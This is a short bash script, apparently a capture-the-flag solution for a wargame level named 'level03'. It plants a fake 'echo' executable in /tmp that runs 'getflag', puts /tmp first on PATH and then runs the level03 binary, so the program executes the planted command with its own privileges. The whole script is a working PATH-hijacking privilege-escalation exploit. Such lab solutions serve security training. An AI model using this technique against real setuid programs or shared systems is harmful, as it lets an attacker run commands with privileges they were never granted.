#!/bin/bash

CURDIR=`dirname $0`

# Create the fake echo that will execute 'getflag'
echo "getflag" > /tmp/echo
chmod +x /tmp/echo

# Add it at the beginning of PATH
PATH=/tmp:$PATH

# Execute tricked 'level03'
$CURDIR/level03